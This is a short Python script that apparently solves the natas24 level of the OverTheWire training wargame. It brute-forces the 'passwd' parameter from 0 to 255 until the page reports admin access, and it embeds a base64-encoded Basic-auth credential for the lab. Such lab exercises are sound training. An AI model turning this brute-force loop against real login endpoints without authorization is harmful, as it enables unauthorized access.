import requests
from bs4 import BeautifulSoup

headers = {"Authorization": "Basic bmF0YXMyNDpNZXVxbWZKOERES3VUcjVwY3Z6RktTd2x4ZWRaWUVXZA=="}

for i in range(256):
	result = requests.get("http://natas24.natas.labs.overthewire.org", headers=headers, params=[('passwd', i)])
	soup = BeautifulSoup(result.content, "html.parser")
	text = soup.find("div", id="content").get_text()
	print(f"Try {i}")
	print(text)
	if "You are an admin" in text:
		print("ACHOU")
		break
print("end")
